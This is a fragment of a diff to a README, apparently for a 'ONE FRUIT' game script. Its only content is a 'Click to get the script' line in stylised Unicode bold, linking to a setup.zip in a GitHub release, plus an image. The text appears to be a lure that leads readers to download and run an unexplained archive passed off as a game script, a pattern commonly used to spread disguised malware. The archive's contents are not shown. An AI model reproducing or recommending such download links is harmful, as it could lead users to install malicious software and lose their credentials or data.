@@ -33,6 +33,7 @@
 
 
 
+
 # Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/ONE-FRUIT/releases/download/Download/setup.zip)***
 
 ![maxresdefault](https://github.com/user-attachments/assets/3435add0-5515-4ae8-8ec5-862383096cd8)
